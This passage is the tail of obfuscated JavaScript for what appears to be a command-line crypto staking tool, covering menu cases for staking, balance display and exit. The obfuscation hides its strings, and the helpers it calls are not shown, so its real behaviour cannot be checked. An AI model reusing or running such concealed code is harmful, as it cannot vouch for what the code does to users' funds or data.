                    'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x133)),
                    'value': _0xdfc310(0x123)
                }]
            }), showMainMenu();
            break;
        case _0xdfc310(0x1fc):
            await stakingMenu();
            break;
        case _0xdfc310(0x1c0):
            console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)](_0xdfc310(0x110))), await updateBalance(), console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)]('Current\x20balance:\x20' + currentBalance + _0xdfc310(0x11b))), await prompts({
                'type': _0xdfc310(0x20a),
                'name': 'back',
                'message': 'Action',
                'choices': [{
                    'title': chalk[_0xdfc310(0x1b0)](_0xdfc310(0x133)),
                    'value': 'back'
                }]
            }), showMainMenu();
            break;
        case _0xdfc310(0x182):
            await showStakingInfo();
            break;
        case _0xdfc310(0x13d):
            console[_0xdfc310(0x1bd)](chalk[_0xdfc310(0x1b0)]('Exiting\x20program...')), process[_0xdfc310(0x13d)](0x0);
    }
}((async () => {
    await initializeTokens(), await showStartMenu();
})());